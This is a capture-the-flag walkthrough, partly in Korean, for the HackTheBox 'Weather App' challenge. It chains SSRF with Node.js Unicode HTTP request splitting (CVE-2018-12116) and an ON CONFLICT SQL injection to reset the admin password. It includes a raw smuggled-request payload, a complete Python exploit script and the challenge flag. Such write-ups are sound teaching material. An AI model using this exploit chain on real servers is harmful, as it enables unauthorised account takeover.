
# HackTheBox Walkthrough - Room: Weather App

**Target IP**: 94.237.57.211:37932  
**Difficulty**: Medium  
**Objective**: Exploit SSRF and HTTP request splitting vulnerability in Node.js to gain admin access and capture the flag.

---

## 🧭 Initial Enumeration

### 🌐 웹 페이지 정보

- 기본 페이지는 Sejong의 날씨 정보를 알려주는 웹사이트

### 🔍 gobuster 디렉토리 스캔

```bash
gobuster dir -u http://94.237.57.211:37932/ -w /usr/share/wordlists/dirb/common.txt -x php,txt
```

→ 결과:

- `/login` (200 OK)
- `/Login` (200 OK)
- `/register` (200 OK)
- `/static/` (301 Redirect)

---

## 🔐 로그인 및 회원가입 페이지

- `/login`, `/register` 페이지 모두 존재
- 기본 SQL Injection 시도 실패:

```text
id: ' or 1=1 --
pw: 1234
```

---

## 🔍 소스 코드 분석 결과

### 📁 /routes/index.js

```js
// /register
if (req.socket.remoteAddress.replace(/^.*:/, '') != '127.0.0.1') {
    return res.status(401).end();
}
```

→ 회원가입 요청은 **localhost(127.0.0.1)** 에서만 가능 → **SSRF로 우회 가능**

### 📁 /login

```js
if (admin) return res.send(fs.readFileSync('/app/flag').toString());
```

→ `admin` 계정으로 로그인 시 **플래그가 출력됨**

---

## 🧠 SSRF 취약점 분석

### 📁 helpers/WeatherHelper.js

```js
let apiKey = '10a62430af617a949055a46fa6dec32f';
let weatherData = await HttpHelper.HttpGet(`http://${endpoint}/data/2.5/weather?q=${city},${country}&units=metric&appid=${apiKey}`);
```

→ 사용자가 입력한 `endpoint`, `city`, `country`를 이용해 외부 API 요청 → **SSRF 가능**

---

## ⚙️ Node.js SSRF + HTTP Request Splitting

- Node.js v8.12.0 (구버전)
- [CVE-2018-12116](https://nvd.nist.gov/vuln/detail/CVE-2018-12116) - Unicode를 이용한 Request Splitting

### 🧪 페이로드 예시

```http
GET /data/2.5/weather?q=vardy HTTP/1.1
HOST: 127.0.0.1

POST /register HTTP/1.1
HOST: 127.0.0.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

username=admin&password=asd') ON CONFLICT (username) DO UPDATE SET password='vardy'--
```

→ `admin` 사용자의 비밀번호를 **vardy**로 변경

---

## 🚀 exploit.py 코드

```python
import requests

url = 'http://94.237.57.211:37932/api/weather'

sqli = "username=admin&password=asd%27%29+ON+CONFLICT+%28username%29+DO+UPDATE+SET+password=%27vardy%27--"
cl = str(len(sqli))

exploit = ''' HTTP/1.1
HOST: 127.0.0.1

POST /register HTTP/1.1
HOST: 127.0.0.1
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: {}

{}

GET /'''.format(cl,sqli)

exploit = exploit.replace(' ', '\u0120')
exploit = exploit.replace('\n','\u010D\u010A')

data = {'endpoint': '127.0.0.1', 'city': 'vardy', 'country':exploit}
response = requests.post(url, data=data)

print(response.status_code)
print(response.text)
```

---

## ✅ 결과 확인

- 로그인 페이지 접속 → `admin / vardy` 입력
- 로그인 성공 시 플래그 출력

```
HTB{w3lc0m3_t0_th3_p1p3_dr34m}
```

🎉 플래그 획득 성공!

---

## 🧠 기술 요약

| 기술                | 설명                                                            |
|---------------------|-----------------------------------------------------------------|
| SSRF                | 서버가 자기 자신에게 요청을 보내도록 유도                      |
| HTTP Request Splitting | 개행 문자를 유니코드로 삽입해 HTTP 요청을 두 개로 분리               |
| Node.js v8 취약점     | CVE-2018-12116 이용, HTTP 요청 분리 후 내부 API에 우회 요청 가능       |
| SQL Injection (ON CONFLICT) | 중복 사용자일 경우 `password` 업데이트                      |

---

## 🎯 최종 결과

- **플래그**: `HTB{w3lc0m3_t0_th3_p1p3_dr34m}`
- **획득 방법**: SSRF + HTTP Request Splitting → Admin 패스워드 변경 → 로그인 후 플래그 출력

---

## 📚 참고 자료

- https://vardy.tistory.com/267  
- https://jaeseokim.dev/Security/nodejs-HTTP-request-splitting%EC%9D%84-%EC%9D%B4%EC%9A%A9%ED%95%9C-SSRF-%EC%B7%A8%EC%95%BD%EC%A0%90featNullCon2020-splitsecond-WriteUp/
